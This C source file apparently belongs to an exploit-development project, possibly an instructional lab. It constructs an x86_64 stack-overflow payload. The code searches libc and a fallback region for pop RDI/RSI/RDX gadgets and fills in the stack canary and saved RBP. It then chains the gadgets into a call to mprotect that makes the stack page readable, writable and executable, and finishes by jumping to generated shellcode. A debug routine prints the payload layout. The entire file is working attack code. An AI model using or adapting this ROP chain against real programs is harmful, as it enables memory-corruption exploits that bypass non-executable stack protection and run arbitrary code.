#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"
#include "strnstr.h"

void initload(PayloadPtr plp) {
	memset(plp, 0, sizeof(*plp));
	initShellcodeUnion(&plp->pl_scu);
} // initload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
	size_t libc_size = getpagesize() * 100;	// Punt
	size_t fbg_size  = getpagesize() * 1;	// Punt

	// Gadgets as strings (x86_64)
	char s_popRDI[]	= {0x5f, 0xc3, 0};
	char s_popRSI[]	= {0x5e, 0xc3, 0};
	char s_popRDX[]	= {0x5a, 0xc3, 0};

	// First try to find gadgets libc
	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_popRDI, libc_size);
	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_popRSI, libc_size);
	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_popRDX, libc_size);

	// Next, get backup gadgets from fallbackGadgets()
	Pointer fbg_popRDI	= strnstr(baseAddressesPtr->fbg_base, s_popRDI, fbg_size);
	Pointer fbg_popRSI	= strnstr(baseAddressesPtr->fbg_base, s_popRSI, fbg_size);
	Pointer fbg_popRDX	= strnstr(baseAddressesPtr->fbg_base, s_popRDX, fbg_size);

	// Things are wrong if I don't find the gadgets in fallbackGadgets()
	assert(fbg_popRDI != NULL);
	assert(fbg_popRSI != NULL);
	assert(fbg_popRDX != NULL);

	// We will need "mprotect()"
	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");

	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', baseAddressesPtr);

	// Buffer offsets are relative to the payload
	baseAddressesPtr->buf_base = plp;

	plp->pl_dst.o		=	indirectToOffset(&plp->pl_dst,			'B', baseAddressesPtr);
	plp->pl_canary.o	=	indirectToOffset(&plp->pl_canary,		'B', baseAddressesPtr);
	plp->pl_rbp.o		=	indirectToOffset(&plp->pl_rbp,			'B', baseAddressesPtr);
	plp->pl_popRDI.o	= libc_popRDI?
					pointerToOffset(libc_popRDI,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRDI,			'F', baseAddressesPtr);
	plp->pl_stackPage.o	=	pointerToOffset(baseAddressesPtr->stack_base,	'S', baseAddressesPtr);
	plp->pl_popRSI.o	= libc_popRSI?
					pointerToOffset(libc_popRSI,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRSI,			'F', baseAddressesPtr);
	plp->pl_stackSize	=	getpagesize();
	plp->pl_popRDX.o	= libc_popRDX?
					pointerToOffset(libc_popRDX,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRDX,			'F', baseAddressesPtr);
	plp->pl_permission	=	0x7;
	plp->pl_mprotect.o	=	pointerToOffset(libc_mprotect,			'L', baseAddressesPtr);

	plp->pl_shellCode.o	=	pointerToOffset(&plp->pl_scu,			'B', baseAddressesPtr);

	return makeShellcode(&plp->pl_scu.sc, p, np);
} // makeload()

static char *p8(void *s0, char *d) {
	char *s = (char *) s0;

	for (int i = 0; i < sizeof(Pointer); i++)
		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];

	return d;
}

void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
	char fmt[] = "%20s: %018p (\"%.8s\")\n";
	char d[sizeof(Pointer)];

	assert(sizeof(d) == 8);

	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, fmt, "pl_dst.p",        plp->pl_dst.p,       p8(&plp->pl_dst,        d));

	fprintf(stderr, fmt, "pl_canary.p",     plp->pl_canary.p,    p8(&plp->pl_canary,     d));
	fprintf(stderr, fmt, "pl_rbp.p",        plp->pl_rbp.p,       p8(&plp->pl_rbp,        d));

	fprintf(stderr, fmt, "pl_popRDI.p",     plp->pl_popRDI.p,    p8(&plp->pl_popRDI,     d));
	fprintf(stderr, fmt, "pl_stackPage.p",  plp->pl_stackPage.p, p8(&plp->pl_stackPage,  d));
	fprintf(stderr, fmt, "pl_popRSI.p",     plp->pl_popRSI.p,    p8(&plp->pl_popRSI,     d));
	fprintf(stderr, fmt, "pl_stackSize",    plp->pl_stackSize,   p8(&plp->pl_stackSize,  d));
	fprintf(stderr, fmt, "pl_popRDX.p",     plp->pl_popRDX.p,    p8(&plp->pl_popRDX,     d));
	fprintf(stderr, fmt, "pl_permission.p", plp->pl_permission,  p8(&plp->pl_permission, d));
	fprintf(stderr, fmt, "pl_mprotect.p",   plp->pl_mprotect.p,  p8(&plp->pl_mprotect,   d));
	
	fprintf(stderr, fmt, "pl_shellCode.p",  plp->pl_shellCode.p, p8(&plp->pl_shellCode,  d));

	dumpShellcode(&plp->pl_scu.sc);
	fprintf(stderr, "--------------------------------------------\n");
} // dumpload()
